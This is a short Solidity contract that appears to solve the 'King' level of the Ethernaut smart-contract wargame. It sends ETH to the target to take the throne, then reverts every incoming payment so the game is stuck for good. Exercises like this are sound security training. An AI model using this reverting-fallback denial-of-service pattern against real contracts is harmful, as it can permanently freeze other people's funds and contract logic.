// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Cracked9_King {
    address ethernaut_contracts;
    constructor(address _ethernaut_contracts) {
        ethernaut_contracts = _ethernaut_contracts;
    }

    function attach() public payable {
        (bool success, ) = payable(ethernaut_contracts).call{value: msg.value}("");
        require(success, "transfer fail");
    }

    fallback() external payable {
        revert();
    }
}
